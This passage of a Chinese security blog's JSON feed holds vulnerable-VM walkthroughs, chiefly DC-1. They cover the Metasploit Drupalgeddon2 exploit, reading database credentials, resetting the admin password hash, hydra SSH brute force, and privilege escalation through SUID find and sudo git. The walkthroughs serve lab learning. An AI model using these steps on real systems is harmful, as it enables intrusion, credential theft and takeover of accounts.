assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span><span class=\"token environment constant\">PATH</span>:/bin:/sbin:/usr/bin:/usr/sbin\t<span class=\"token comment\"># 设置环境变量</span></pre></td></tr></table></figure><p>此时命令基本上都可以使用了</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230610155406686.png\" alt=\"image-20230610155406686\" /></p>\n<p>此时我们切换 jerry 的账号</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">su</span> jerry</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230610155456954.png\" alt=\"image-20230610155456954\" /></p>\n<p>找到第四个 <code>Flag4</code></p>\n<p>提示我们利用 <code>git</code>  来提权</p>\n<h3 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h3>\n<p>我们查看一下有 root 权限的指令</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230610155641125.png\" alt=\"image-20230610155641125\" /></p>\n<p>只有 <code>git</code></p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dfRnVfUS9hcnRpY2xlL2RldGFpbHMvMTE2Mjc2MDk2\">git 提权方法</span></p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">git</span> <span class=\"token parameter variable\">-p</span> <span class=\"token parameter variable\">--help</span></pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230610155845910.png\" alt=\"image-20230610155845910\" /></p>\n<p>这里我们将 <code>:</code>  变成 <code>!</code>  然后输入 shell，这里我们将 root 的密码更改掉</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230610155947153.png\" alt=\"image-20230610155947153\" /></p>\n<p>这样就更改成功了</p>\n<p>随后切换到 root 用户 在 /root 下找到最终的 Flag</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230610160133168.png\" alt=\"image-20230610160133168\" /></p>\n<p>至此本章结束</p>\n",
            "tags": [
                "靶场",
                "靶场复现"
            ]
        },
        {
            "id": "http://k1nako.github.io/DC-1%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/",
            "url": "http://k1nako.github.io/DC-1%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/",
            "title": "DC-1 渗透测试",
            "date_published": "2023-06-07T13:32:23.000Z",
            "content_html": "<p>DC 靶场系列</p>\n<p><span id=\"more\"></span></p>\n<p>DC1，开始逐渐打靶，加油加油</p>\n<h2 id=\"一-环境搭建\"><a class=\"anchor\" href=\"#一-环境搭建\">#</a> 一、环境搭建</h2>\n<h3 id=\"准备工具\"><a class=\"anchor\" href=\"#准备工具\">#</a> 准备工具</h3>\n<p><strong>kali</strong></p>\n<p><strong>DC-1 靶机</strong></p>\n<h3 id=\"靶机下载地址\"><a class=\"anchor\" href=\"#靶机下载地址\">#</a> 靶机下载地址</h3>\n<ul>\n<li><strong>DC-1.zip</strong> (Size: 733 MB)</li>\n<li><strong>Download</strong>: <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5maXZlODYuY29tL2Rvd25sb2Fkcy9EQy0xLnppcA==\">http://www.five86.com/downloads/DC-1.zip</span></li>\n<li><strong>Download (Mirror)</strong>: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9kYy9EQy0xLnppcA==\">https://download.vulnhub.com/dc/DC-1.zip</span></li>\n</ul>\n<h3 id=\"安装过程\"><a class=\"anchor\" href=\"#安装过程\">#</a> 安装过程</h3>\n<p>解压得到 DC-1.ova 文件</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230606211804839.png\" alt=\"image-20230606211804839\" /></p>\n<p>用 vmware 虚拟机打开此文件</p>\n<p>如提示导入失败，点击重试即可</p>\n<p>kali 和靶机得网络连接模式都改为 NAT 模式，不然 kali 扫不出靶机的 ip</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230606211955678.png\" alt=\"image-20230606211955678\" /></p>\n<h2 id=\"二-渗透过程\"><a class=\"anchor\" href=\"#二-渗透过程\">#</a> 二、渗透过程</h2>\n<p><strong>攻击机 (kali) ip</strong>：192.168.16.129</p>\n<p><strong>靶机 (DC-1) ip</strong>：192.168.16.131</p>\n<h3 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h3>\n<h4 id=\"探测目标ip\"><a class=\"anchor\" href=\"#探测目标ip\">#</a> 探测目标 ip</h4>\n<p>kali 里面有很多探测目标 ip 的工具，例如本文要讲的 arp-scan、netdiscover、nmap</p>\n<p><strong>arp-scan</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>arp-scan <span class=\"token parameter variable\">-l</span></pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230606212548326.png\" alt=\"image-20230606212548326\" /></p>\n<p>可以很明显的看到一个可疑的 <code>.131</code>  ip 很可能就是我们的靶机，</p>\n<p>我们可以查看靶机的 mac 地址，与我们探测出来的 mac 地址一样</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230606213337360.png\" alt=\"image-20230606213337360\" /></p>\n<p><strong>netdiscover</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>netdiscover</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230606213455640.png\" alt=\"image-20230606213455640\" /></p>\n<p><strong>nmap</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> <span class=\"token number\">192.168</span>.16.0/24</pre></td></tr></table></figure><blockquote>\n<p>ip 后面改为 0/24，是因为这里的 192.168.16.0/24 表示的是这个网段的 ip 地址从 192.168.16.1 开始，到 192.168.16.254 结束（192.168.16.0 和 192.168.16.255 有特殊含义不能当做 ip 地址），子网掩码为 255.255.255.0</p>\n</blockquote>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230606213635960.png\" alt=\"image-20230606213635960\" /></p>\n<h4 id=\"探测目标端口\"><a class=\"anchor\" href=\"#探测目标端口\">#</a> 探测目标端口</h4>\n<p>用 <code>nmap</code>  来检测</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token parameter variable\">-sV</span> <span class=\"token number\">192.168</span>.16.131 -p- <span class=\"token parameter variable\">--open</span></pre></td></tr></table></figure><blockquote>\n<p>-sV 扫描目标主机端口并显示相关信息</p>\n<p>-p- 扫描所有端口 0-65535</p>\n<p>--open 只显示已开启的端口</p>\n</blockquote>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230606215724755.png\" alt=\"image-20230606215724755\" /></p>\n<p>我们的突破口在 <code>22</code>   <code>80</code>  ，因为  <code>80</code>  是 http 协议，所以我们用浏览器打开</p>\n<blockquote>\n<p>如不能打开，更改 C:\\Windows\\System32\\drivers\\etc\\hosts 文件</p>\n<p>将 192.168.16.131 dc-1 添加进去即可</p>\n</blockquote>\n<h4 id=\"网页信息收集\"><a class=\"anchor\" href=\"#网页信息收集\">#</a> 网页信息收集</h4>\n<p>利用插件 <code>wappalyzer</code>  ，可以看到很多网页的信息，看到了眼熟的 CMS  <code>Drupal</code></p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230606220335906.png\" alt=\"image-20230606220335906\" /></p>\n<p>也可以用 kali 的工具  <code>whatweb</code></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>whatweb <span class=\"token parameter variable\">-v</span> <span class=\"token number\">192.168</span>.16.131</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230606220703745.png\" alt=\"image-20230606220703745\" /></p>\n<p>我们可以得到以下信息</p>\n<blockquote>\n<p>CMS 是 Drupal</p>\n<p>Apache 2.2.22</p>\n<p>PHP 5.4.45</p>\n</blockquote>\n<h3 id=\"漏洞查找与利用\"><a class=\"anchor\" href=\"#漏洞查找与利用\">#</a> 漏洞查找与利用</h3>\n<h4 id=\"漏洞查找\"><a class=\"anchor\" href=\"#漏洞查找\">#</a> 漏洞查找</h4>\n<p>都已经知道 cms 是 drupal</p>\n<p>网上一搜全是漏洞复现的文章</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230606221147493.png\" alt=\"image-20230606221147493\" /></p>\n<p>也可以用 kali 里的 <code>Metasploit</code>  查找 drupal 漏洞</p>\n<p>首先  <code>msfconsole</code>  启动该工具</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msf6 <span class=\"token operator\">></span> search drupal</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230606221442099.png\" alt=\"image-20230606221442099\" /></p>\n<p>可以看到有很多的框架漏洞，这里我们使用等级较高的，日期 18 年</p>\n<h4 id=\"漏洞利用\"><a class=\"anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h4>\n<p>使用 18 年那个漏洞</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msf6 <span class=\"token operator\">></span> use exploit/unix/webapp/drupal_drupalgeddon2 </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>或</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>msf6 <span class=\"token operator\">></span> use <span class=\"token number\">1</span></pre></td></tr></table></figure><p>然后</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>show options</pre></td></tr></table></figure><p>查看漏洞模块参数</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230606222236211.png\" alt=\"image-20230606222236211\" /></p>\n<blockquote>\n<p>Current Setting : 这里是要配置的内容</p>\n<p>Required : yes 是必须要配置的，no 是可配可不配</p>\n</blockquote>\n<p>就像上面 RHOSTS 是空着的，所以我们需要将他补上</p>\n<blockquote>\n<p>LHOSTS 本机 ip</p>\n<p>RHOSTS 靶机 ip</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">set</span> RHOSTS <span class=\"token number\">192.168</span>.16.131</pre></td></tr></table></figure><p>配置完直接运行即可</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>run</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>或</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>exploit</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230606222604693.png\" alt=\"image-20230606222604693\" /></p>\n<p>出现这个就说明我们攻击成功了，接下来我们就可以直接上 shell</p>\n<h3 id=\"getshell\"><a class=\"anchor\" href=\"#getshell\">#</a> Getshell</h3>\n<h4 id=\"获取普通shell\"><a class=\"anchor\" href=\"#获取普通shell\">#</a> 获取普通 shell</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shell</pre></td></tr></table></figure><p>直接输入 shell 能执行指令，这里输入 <code>ls</code>  可以发现能直接执行</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230606222754367.png\" alt=\"image-20230606222754367\" /></p>\n<h4 id=\"获取交互式shell\"><a class=\"anchor\" href=\"#获取交互式shell\">#</a> 获取交互式 shell</h4>\n<p>这里我们可以利用到 python 的模块，前提是主机里装有 python</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-c</span> <span class=\"token string\">'import pty;pty.spawn(\"/bin/bash\")'</span></pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230606223127443.png\" alt=\"image-20230606223127443\" /></p>\n<p>这样会好看点，可以看到有个 flag1.txt ，这是我们找到的第一个 flag</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230606223209084.png\" alt=\"image-20230606223209084\" /></p>\n<p>这里根据 flag1.txt 的提示，查看 CMS 的配置文件，这里我们百度以下 Drupal 的配置文件是什么</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230606223432596.png\" alt=\"image-20230606223432596\" /></p>\n<p>配置文件是 <code>settings.php</code>  我们回 kali 里查找</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-name</span> settings.php</pre></td></tr></table></figure><blockquote>\n<p>find 查找指令</p>\n<p>/ \t根目录</p>\n</blockquote>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230606223557721.png\" alt=\"image-20230606223557721\" /></p>\n<p>直接去查看配置文件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">tac</span> /var/www/sites/default/settings.php</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230606224058356.png\" alt=\"image-20230606224058356\" /></p>\n<p>可以看到 mysql 数据库的账号密码，还有我们的 flag2 暂时没什么用先放着</p>\n<p>我们先连接数据库</p>\n<h3 id=\"数据库渗透\"><a class=\"anchor\" href=\"#数据库渗透\">#</a> 数据库渗透</h3>\n<p>由上面的账号密码登入</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql <span class=\"token parameter variable\">-udbuser</span> <span class=\"token parameter variable\">-pR0ck3t</span></pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230606224608869.png\" alt=\"image-20230606224608869\" /></p>\n<pre><code class=\"language-mysql\">use drupaldb;show tables;\n</code></pre>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230606224801325.png\" alt=\"image-20230606224801325\" /></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> * from <span class=\"token function\">users</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">select</span> name,pass from <span class=\"token function\">users</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230606224900751.png\" alt=\"image-20230606224900751\" /></p>\n<p>这样只查看 name 和 pass 会方便很多</p>\n<p>可以看到这里有网站 admin 的账号密码，但是密码被加密</p>\n<p>加密脚本在  <code>/var/www/scripts/password-hash.sh</code></p>\n<p>我们可以将 admin 的密码更改掉</p>\n<p>因为加密脚本是 php 写的，所以直接用 php 执行即可</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>先退出 mysql</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>php /var/www/scripts/password-hash.sh <span class=\"token number\">123456</span></pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230606225343401.png\" alt=\"image-20230606225343401\" /></p>\n<pre><code>$S$DUfLi3H99AneMTfLKR.T6BuYivB8jczEhAjQemtPtyTo8Hfo4n1Q\n</code></pre>\n<p>我们将  <code>123456</code>  的密文先保存起来</p>\n<p>然后返回到 mysql</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>update <span class=\"token function\">users</span> <span class=\"token builtin class-name\">set</span> pass <span class=\"token operator\">=</span> <span class=\"token string\">\"<span class=\"token variable\">$S</span><span class=\"token variable\">$DUfLi3H99AneMTfLKR</span>.T6BuYivB8jczEhAjQemtPtyTo8Hfo4n1Q\"</span> where name <span class=\"token operator\">=</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230606225751973.png\" alt=\"image-20230606225751973\" /></p>\n<p>这样密码就修改成功了，前往浏览器登陆账号</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230606225903110.png\" alt=\"image-20230606225903110\" /></p>\n<p>发现 flag3 ，得到线索，查看 <code>/etc/passwd</code>  文件</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230606230033930.png\" alt=\"image-20230606230033930\" /></p>\n<p>这里有个 flag4 的账号，我们通过 ssh 爆破的方式获取密码</p>\n<h3 id=\"用户密码爆破\"><a class=\"anchor\" href=\"#用户密码爆破\">#</a> 用户密码爆破</h3>\n<p>利用  <code>hydra</code>  爆破 flag4 的密码，用 kali 自带的字典</p>\n<p>在本机上爆破密码</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hydra <span class=\"token parameter variable\">-l</span> flag4 <span class=\"token parameter variable\">-P</span> /usr/share/wordlists/rockyou.txt.gz <span class=\"token parameter variable\">-v</span> ssh://192.168.16.131</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230606230535073.png\" alt=\"image-20230606230535073\" /></p>\n<p>成功爆破出来，密码 orange，用 kali 连接</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> flag4@192.168.16.131</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230607194806506.png\" alt=\"image-20230607194806506\" /></p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230607194848816.png\" alt=\"image-20230607194848816\" /></p>\n<p>获取线索，用同样的方法查找在 /root 下的 flag</p>\n<h3 id=\"linux-提权\"><a class=\"anchor\" href=\"#linux-提权\">#</a> Linux 提权</h3>\n<p>需要用到 SUID 提权，参考以下</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI3MjYxNy5odG1s\">简谈 SUID 提权 - FreeBuf 网络安全行业门户</span></p>\n</blockquote>\n<p>利用 <code>find</code>  命令，找查具有 SUID 权限的可执行二进制文件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-perm</span> <span class=\"token parameter variable\">-u</span><span class=\"token operator\">=</span>s <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230607195751262.png\" alt=\"image-20230607195751262\" /></p>\n<p>这里我们看到 <code>find</code> ，find 比较常用，所以我们可以执行 root 权限的命令找查文件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-name</span> index.php <span class=\"token parameter variable\">-exec</span> <span class=\"token string\">\"/bin/sh\"</span> <span class=\"token punctuation\">\\</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>查什么文件不重要（但是必须得是存在的文件）只要格式对了，后面加上 -exec &quot;/bin/sh&quot; ; 就行</p>\n</blockquote>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230607202817386.png\" alt=\"image-20230607202817386\" /></p>\n<p>可以看到这里我们已经提权成功了，接下来就是查看最后一个 flag 的内容</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> /root</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">ls</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">cat</span> *</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230607203024465.png\" alt=\"image-20230607203024465\" /></p>\n<p>这样就拿到第五个 flag 啦，成功拿到 root 权限，渗透结束</p>\n<h2 id=\"三-知识总结\"><a class=\"anchor\" href=\"#三-知识总结\">#</a> 三、知识总结</h2>\n<h4 id=\"主机扫描\"><a class=\"anchor\" href=\"#主机扫描\">#</a> 主机扫描</h4>\n<ul>\n<li>\n<p><strong>arp-scan</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>arp-scan <span class=\"token parameter variable\">-l</span></pre></td></tr></table></figure><blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpdmVyMTAwZGF5L2FydGljbGUvZGV0YWlscy8xMTc1NjA4Mjg=\">arp-scan 使用教程</span></p>\n</blockquote>\n</li>\n<li>\n<p><strong>netdiscover</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>netdiscover</pre></td></tr></table></figure><blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaGl5b25nL3AvMTQ1OTAyMDkuaHRtbA==\">Netdiscover 网络扫描工具</span></p>\n</blockquote>\n</li>\n<li>\n<p><strong>nmap</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> <span class=\"token function\">ip</span></pre></td></tr></table></figure><blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmcvYXJ0aWNsZS9kZXRhaWxzLzEwNTk2NDQ4Ng==\">nmap 详细使用教程</span></p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"信息收集-2\"><a class=\"anchor\" href=\"#信息收集-2\">#</a> 信息收集</h4>\n<ul>\n<li>\n<p><strong>whatweb</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>whatweb <span class=\"token parameter variable\">-v</span> 域名</pre></td></tr></table></figure><blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTc3NTc2L2FydGljbGUvZGV0YWlscy8xMjk5NzMwMTQ=\">whatweb 安装使用</span></p>\n</blockquote>\n</li>\n<li>\n<p><strong>扩展插件 wappalyzer</strong></p>\n</li>\n</ul>\n<h4 id=\"漏洞查找及利用\"><a class=\"anchor\" href=\"#漏洞查找及利用\">#</a> 漏洞查找及利用</h4>\n<ul>\n<li>\n<p>Metasploit</p>\n<p>先打开 msf 控制台</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msfconsole</pre></td></tr></table></figure><p>然后查找需要的漏洞</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>search 漏洞名/cms</pre></td></tr></table></figure><p>并且使用模块</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use 模块目录/编号</pre></td></tr></table></figure><p>显示模块参数</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>show options</pre></td></tr></table></figure><p>设置模块参数</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">set</span> 模块参数名 参数值</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#如 set lhost 1.1.1.1</span></pre></td></tr></table></figure><p>开始攻击</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>run或exploit</pre></td></tr></table></figure><blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC85Nzg5NDE5NQ==\">metasploit 渗透测试</span></p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"getshell-2\"><a class=\"anchor\" href=\"#getshell-2\">#</a> Getshell</h4>\n<p>使用 <code>MSF</code>  攻击等待主机与目标连接完成后</p>\n<p>攻击成功直接进入命令行即可</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shell</pre></td></tr></table></figure><p>获取交互 shell（需要对方主机安装有 python）</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-c</span> <span class=\"token string\">'import pty;pty.spawn(\"/bin/bash\")'</span></pre></td></tr></table></figure><h4 id=\"密码爆破与ssh\"><a class=\"anchor\" href=\"#密码爆破与ssh\">#</a> 密码爆破与 SSH</h4>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1d2VpbGl5aS9hcnRpY2xlL2RldGFpbHMvMTA1NTIzODIz\">Hydra（海德拉）使用详解</span></p>\n</blockquote>\n<p>以爆破 SSH 为例</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hydra <span class=\"token parameter variable\">-l</span> 指定用户名 <span class=\"token parameter variable\">-p</span> 指定密码 ssh://目标主机</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>hydra <span class=\"token parameter variable\">-L</span> 用户字典 <span class=\"token parameter variable\">-P</span> 密码字典 ssh://目标主机</pre></td></tr></table></figure><p>爆破完后我们可以用 kali 登入</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> 用户名@目标攻击主机</pre></td></tr></table></figure><h4 id=\"linux系统的suid提权\"><a class=\"anchor\" href=\"#linux系统的suid提权\">#</a> Linux 系统的 SUID 提权</h4>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI3MjYxNy5odG1s\">简谈 SUID 提权</span></p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-perm</span> <span class=\"token parameter variable\">-u</span><span class=\"token operator\">=</span>s <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null</pre></td></tr></table></figure><blockquote>\n<p>这句命令的意思是找到 SUID 权限的二进制文件</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTQ0MTcyNy9hcnRpY2xlL2RldGFpbHMvMTE0MTA2MzM1\">find /-perm -4000 2＞/dev/null 的拆分讲解</span></p>\n</blockquote>\n<p>然后再用相关指令进行提权。这里以 find 为例（常用）</p>\n<p>先 ls 查看当前有什么文件，假设当前目录下有个 123.php，利用有权限的 <code>find</code>  指令搭配 <code>exec</code>  进行提权</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-name</span> <span class=\"token number\">123</span>.php <span class=\"token parameter variable\">-exec</span> <span class=\"token string\">\"/bin/sh\"</span> <span class=\"token punctuation\">\\</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>至此本章结束</p>\n",
            "tags": [
                "靶场",
                "靶场复现"
            ]
        },
        {
            "id": "http://k1nako.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%20WordPress%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/",
            "url": "http://k1nako.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%20WordPress%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/",
            "title": "记一次 WordPress 渗透测试",
            "date_published": "2023-06-03T06:50:57.000Z",
